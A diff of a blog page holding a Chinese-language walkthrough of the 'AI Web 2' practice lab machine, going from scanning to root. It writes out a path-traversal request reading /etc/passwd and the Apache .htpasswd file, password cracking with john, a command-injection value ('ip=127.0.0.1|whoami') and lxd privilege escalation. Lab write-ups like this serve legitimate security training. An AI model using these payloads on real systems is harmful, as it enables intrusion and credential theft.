@@ -505,7 +505,91 @@
   <div class="main-content">
     <article class="post post-detail">
       <div class="post-content">
-        <h1 id="AI-Web-2靶场闯关"><a href="#AI-Web-2靶场闯关" class="headerlink" title="AI Web 2靶场闯关"></a>AI Web 2靶场闯关</h1><p> 获取目标主机的ip地址<br> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> netdiscover <span class="token parameter variable">-r</span> <span class="token number">192.168</span>.124.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br> <img src="/2023/07/17/AI-Web-2/1.png" class=""><br> 得到靶机ip为192.168.124.20<br> 对靶机进行nmap扫描<br> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> nmap <span class="token parameter variable">-sS</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-T4</span> <span class="token parameter variable">-A</span> -p- <span class="token number">192.168</span>.124.20<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br> <img src="/2023/07/17/AI-Web-2/2.png" class=""><br> 可以看到靶机开放了22和80端口以及端口对应的信息。<br> dirb爆破http 80端口目录<br> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirb http://192.168.124.20 <span class="token parameter variable">-X</span> .html,.php,.zip,.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br> <img src="/2023/07/17/AI-Web-2/3.png" class=""><br> dirsearch爆破http 80端口目录<br> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch <span class="token parameter variable">-u</span> <span class="token string">"http://192.168.124.20"</span> <span class="token parameter variable">-e</span> html,php,txt,zip <span class="token parameter variable">-i</span> <span class="token number">200,401</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br> <img src="/2023/07/17/AI-Web-2/4.png" class=""><br> 访问<code>http://192.168.124.20/download.php</code>,发现页面可以下载，但内容为空<br> <img src="/2023/07/17/AI-Web-2/5.png" class=""><br> 访问<code>http://192.168.124.20/index.php</code>,发现是一个只需要输入用户名的登录页面<br> <img src="/2023/07/17/AI-Web-2/6.png" class=""><br> 使用常用帐号登录未果，使用burp爆破也未果<br> <img src="/2023/07/17/AI-Web-2/7.png" class=""><br> <img src="/2023/07/17/AI-Web-2/8.png" class=""><br> 点击index页面的<code>signup</code>注册按钮，注册一个新用户<code>admin</code>,点击ok<br> <img src="/2023/07/17/AI-Web-2/9.png" class=""><br> 继续使用新注册的用户名<code>admin</code>登录<br> <img src="/2023/07/17/AI-Web-2/10.png" class=""><br> 虽然进入后台，但没有发现有价值的信息。<br> google搜索<code>XuezhuLi FileSharing</code><br> <img src="/2023/07/17/AI-Web-2/11.png" class=""><br> 发现该系统存在目录穿越漏洞<br> <img src="/2023/07/17/AI-Web-2/12.png" class=""><br> 该漏洞存在于两个位置<br> <img src="/2023/07/17/AI-Web-2/13.png" class=""><br> 验证第1个漏洞点，访问<code>http://192.168.124.20/</code></p>
+        <h1 id="AI-Web-2靶场闯关"><a href="#AI-Web-2靶场闯关" class="headerlink" title="AI Web 2靶场闯关"></a>AI Web 2靶场闯关</h1><p> 获取目标主机的ip地址<br> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> netdiscover <span class="token parameter variable">-r</span> <span class="token number">192.168</span>.124.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br> <img src="/2023/07/17/AI-Web-2/1.png" class=""><br> 得到靶机ip为192.168.124.20<br> 对靶机进行nmap扫描<br> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> nmap <span class="token parameter variable">-sS</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-T4</span> <span class="token parameter variable">-A</span> -p- <span class="token number">192.168</span>.124.20<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br> <img src="/2023/07/17/AI-Web-2/2.png" class=""><br> 可以看到靶机开放了22和80端口以及端口对应的信息。<br> dirb爆破http 80端口目录<br> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirb http://192.168.124.20 <span class="token parameter variable">-X</span> .html,.php,.zip,.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br> <img src="/2023/07/17/AI-Web-2/3.png" class=""><br> dirsearch爆破http 80端口目录<br> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch <span class="token parameter variable">-u</span> <span class="token string">"http://192.168.124.20"</span> <span class="token parameter variable">-e</span> html,php,txt,zip <span class="token parameter variable">-i</span> <span class="token number">200,401</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br> <img src="/2023/07/17/AI-Web-2/4.png" class=""><br> 访问<code>http://192.168.124.20/download.php</code>,发现页面可以下载，但内容为空<br> <img src="/2023/07/17/AI-Web-2/5.png" class=""><br> 访问<code>http://192.168.124.20/index.php</code>,发现是一个只需要输入用户名的登录页面<br> <img src="/2023/07/17/AI-Web-2/6.png" class=""><br> 使用常用帐号登录未果，使用burp爆破也未果<br> <img src="/2023/07/17/AI-Web-2/7.png" class=""><br> <img src="/2023/07/17/AI-Web-2/8.png" class=""><br> 点击index页面的<code>signup</code>注册按钮，注册一个新用户<code>admin</code>,点击ok<br> <img src="/2023/07/17/AI-Web-2/9.png" class=""><br> 继续使用新注册的用户名<code>admin</code>登录<br> <img src="/2023/07/17/AI-Web-2/10.png" class=""><br> 虽然进入后台，但没有发现有价值的信息。<br> google搜索<code>XuezhuLi FileSharing</code><br> <img src="/2023/07/17/AI-Web-2/11.png" class=""><br> 发现该系统存在目录穿越漏洞<br> <img src="/2023/07/17/AI-Web-2/12.png" class=""><br> 该漏洞存在于两个位置<br> <img src="/2023/07/17/AI-Web-2/13.png" class=""><br> 验证第1个漏洞点，访问<code>http://192.168.124.20/download.php?file_name=../../../../../../../../../../../../../etc/passwd</code><br> 靶机的用户名文件被成功下载，文件内容为<br> <img src="/2023/07/17/AI-Web-2/14.png" class=""><br> 证明漏洞点1存在。<br> 验证第2个漏洞点，访问<code>http://192.168.124.20/viewing.php?file_name=../../../../../../../../../../../../../etc/passwd</code><br> <img src="/2023/07/17/AI-Web-2/15.png" class=""><br> 漏洞点2验证失败。<br> 根据读取到的&#x2F;etc&#x2F;passwd文件我们获得了靶机的三个用户<code>root aiweb2 n0nr00tuser</code><br> 由于靶机开放22端口，因此对靶机的ssh进行爆破，未果。<br> 由于靶机80端口服务是apache,因此利用目录穿越漏洞读取靶机apache2的认证文件，访问<code>http://192.168.124.20/download.php?file_name=../../../../../../../../../../../../../etc/apache2/.htpasswd</code><br> <img src="/2023/07/17/AI-Web-2/16.png" class=""><br>使用john破解密码</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">john <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>/usr/share/wordlists/rockyou.txt htpasswd.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>显示john破解出的密码</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">john <span class="token parameter variable">--show</span> htpasswd.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="/2023/07/17/AI-Web-2/17.png" class="">
+<p>得到apache2认证的帐号密码为<code>aiweb2admin</code>:<code>c.ronaldo</code><br>访问<code>http://192.168.124.20/webadmin/</code>,输入apache2认证的帐号密码</p>
+<img src="/2023/07/17/AI-Web-2/18.png" class="">
+<p>点击登录，进入webadmin目录</p>
+<img src="/2023/07/17/AI-Web-2/19.png" class="">
+<p>根据页面提示访问robots文件<code>http://192.168.124.20/webadmin/robots.txt</code></p>
+<img src="/2023/07/17/AI-Web-2/20.png" class="">
+<p>访问<code>http://192.168.124.20/webadmin/H05Tpin9555/</code></p>
+<img src="/2023/07/17/AI-Web-2/21.png" class="">
+<p>ping 127.0.0.1,burp抓包</p>
+<img src="/2023/07/17/AI-Web-2/22.png" class="">
+<p>将请求数据包发送到repeater模块，测试<code>ip</code>参数是否存在RCE漏洞<br>构造<code>ip=127.0.0.1|whoami</code></p>
+<img src="/2023/07/17/AI-Web-2/23.png" class="">
+<p>成功获取到当前用户<code>www-data</code>,说明<code>|</code>可以绕过执行单一命令的限制<br>继续依次测试<code>||</code>，<code>&amp;</code>，<code>&amp;&amp;</code>，<code>;</code>,均未能绕过。<br>访问<code>http://192.168.124.20/webadmin/S0mextras/</code></p>
+<img src="/2023/07/17/AI-Web-2/24.png" class="">
+<p>根据页面显示的内容我们判断该目录下应该存在有趣的东西。<br>查看当前路径<code>ip=127.0.0.1|pwd</code></p>
+<img src="/2023/07/17/AI-Web-2/25.png" class="">
+<p>可以看到当前路径是<code>/var/www/html/webadmin/H05Tpin9555</code><br>列出<code>/S0mextras/</code>目录下的所有东西<code>ip=127.0.0.1|ls -al /var/www/html/webadmin/S0mextras/</code></p>
+<img src="/2023/07/17/AI-Web-2/26.png" class="">
+<p>只有一个index.html<br>继续使用<code>find</code>命令查找<code>ip=127.0.0.1|find . -type f /var/www/html/webadmin/S0mext</code><br>注：<code>.</code>表示当前目录，<code>f</code>表示普通文件</p>
+<img src="/2023/07/17/AI-Web-2/27.png" class="">
+<p>查看<code>/var/www/html/webadmin/S0mextras/.sshUserCred55512.txt</code>文件</p>
+<img src="/2023/07/17/AI-Web-2/28.png" class="">
+<p>得到了ssh用户名密码<code>n0nr00tuser:zxowieoi4sdsadpEClDws1sf</code><br>连接靶机的ssh端口</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> n0nr00tuser@192.168.124.20<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>输入密码，成功进入靶机系统</p>
+<img src="/2023/07/17/AI-Web-2/29.png" class="">
+<p>查看当前用户可以用sudo执行哪些命令</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="/2023/07/17/AI-Web-2/30.png" class="">
+<p>显示当前用户无权限执行sudo命令。<br>查看当前系统内核版本</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">uname</span> <span class="token parameter variable">-a</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="/2023/07/17/AI-Web-2/31.png" class="">
+<p>显示当前系统内核是<code>linux 4.15</code>的内核。<br>尝试内核提权，搜索<code>linux 4.15</code>的内核提权漏洞</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">searchsploit linux kernel <span class="token number">4.15</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="/2023/07/17/AI-Web-2/32.png" class="">
+<p>我选择47167.sh作为提权脚本，在靶机系统上下载下来运行</p>
+<img src="/2023/07/17/AI-Web-2/33.png" class="">
+<p>注：如果sh脚本执行显示<code>/bin/sh^M: bad interpreter: No such file or directory</code>，这是由于不同系统编码格式引起的，则需要vim打开该sh脚本，然后<code>set ff=unix</code></p>
+<img src="/2023/07/17/AI-Web-2/34.png" class="">
+<p>提示当前用户没有权限执行<code>sudo apt install gcc</code>命令，因此内核提权无法进行。<br>下载<code>LinEnum</code>到靶机来搜集信息进行提权<br>注：<a target="_blank" rel="noopener" href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./LinEnum.sh <span class="token parameter variable">-r</span> report.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="/2023/07/17/AI-Web-2/35.png" class="">
+<p>我们可以看到当前系统内存在<code>lxd容器</code>，因此我们搜索lxd的提权漏洞</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">searchsploit lxd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="/2023/07/17/AI-Web-2/36.png" class="">
+<p>将lxd提权脚本下载到靶机系统上进行执行</p>
+<img src="/2023/07/17/AI-Web-2/37.png" class="">
+<p>我们这里可以看到<code>-f</code>参数需要提供一个.tar.gz的alpine文件<br>查看脚本的帮助信息</p>
+<img src="/2023/07/17/AI-Web-2/38.png" class="">
+<p>根据脚本帮助信息首先在自己主机上执行<code>wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine</code><br>然后在自己主机上构建alpine<code>sudo ./build-alpine</code><br>alpine构建完成后会在当前目录下生成一个.tar.gz的文件，然后将该文件上传到靶机系统内。<br>在靶机系统内继续执行lxd提权脚本</p>
+<img src="/2023/07/17/AI-Web-2/39.png" class="">
+<p>可以看到我们已经获得了root权限。</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /mnt/root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="/2023/07/17/AI-Web-2/40.png" class="">
+<p>此时我们相当于已经进入了靶机的系统根目录。<br>由于flag文件存在于靶机的root目录中，因此我们继续cd到靶机的root目录</p>
+<img src="/2023/07/17/AI-Web-2/41.png" class="">
+<p>读取flag文件内容</p>
+<img src="/2023/07/17/AI-Web-2/42.png" class="">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
       </div>
       <div class="post-tags-categories">
